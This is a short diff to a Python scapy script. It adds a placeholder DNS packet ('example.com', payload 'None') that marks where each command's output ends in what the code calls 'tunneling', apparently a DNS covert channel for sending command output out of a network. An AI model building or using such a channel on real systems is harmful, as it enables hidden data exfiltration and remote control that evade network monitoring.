@@ -141,3 +141,14 @@ if __name__ == "__main__":
             # increasing sequence id
             txid += 1
 
+        # After sending real data segments, we are breaking between commands with placeholder packet
+        # the packet here contains request for `example.com` and `None` payload, just for cut the segments sequence,
+        # so we could know that command output ended
+
+        dns_hdr = scapy.DNS(qd=scapy.DNSQR(qname="example.com"), id=txid)
+
+        raw_hdr = scapy.Raw(load="None")
+
+        tunneling = ip_hdr / udp_hdr / dns_hdr / raw_hdr
+
+        scapy.send(tunneling)
